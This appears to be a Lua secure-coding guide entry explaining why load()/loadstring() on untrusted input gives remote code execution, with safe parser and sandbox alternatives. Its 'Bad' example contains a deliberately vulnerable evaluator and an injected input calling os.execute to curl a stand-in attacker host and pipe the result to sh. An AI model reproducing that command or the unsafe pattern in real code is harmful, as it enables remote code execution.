# anti-loadstring-eval

> Anti-pattern: using `load`/`loadstring` on untrusted input

## Why It Matters

`load()` (and the deprecated 5.1 alias `loadstring()`) compiles and can execute arbitrary Lua source at runtime — feeding it anything derived from user input, network data, or any other untrusted source is equivalent to giving that source full code-execution rights in your process, including (absent a sandboxed `_ENV`) file system access, network access, and the ability to call `os.execute`.

## Bad

```lua
-- A "configurable formula" feature that evaluates user-supplied Lua as
-- an expression -- a textbook remote-code-execution vulnerability
local function evaluate_formula(user_formula, variables)
  local fn = load("return " .. user_formula, "formula", "t", variables)
  return fn()
end

evaluate_formula("os.execute('curl attacker.com/steal | sh') or price * qty", vars)
-- runs with the full privileges of the host process
```

## Good

```lua
-- Option 1: don't evaluate arbitrary code at all -- parse a small, safe,
-- purpose-built expression grammar instead (a real parser, not load())
local function evaluate_formula(user_formula, variables)
  local ast = parse_safe_expression(user_formula)  -- your own tiny grammar
  return evaluate_ast(ast, variables)               -- interprets safely, no code exec
end

-- Option 2: if load() is unavoidable (e.g. a genuine scripting feature for
-- trusted users), always run it inside a restricted _ENV sandbox (see
-- embed-sandbox-restrict-env) and never expose os/io/require to it
local sandbox_env = { math = { floor = math.floor } }  -- deliberately minimal
local fn, err = load("return " .. user_formula, "formula", "t", sandbox_env)
if not fn then
  return nil, "invalid formula: " .. err
end
local ok, result = pcall(fn)
if not ok then
  return nil, "formula evaluation failed: " .. tostring(result)
end
return result
```

## See Also

- [embed-sandbox-restrict-env](embed-sandbox-restrict-env.md)
- [anti-string-dispatch](anti-string-dispatch.md)
- [err-validate-args](err-validate-args.md)
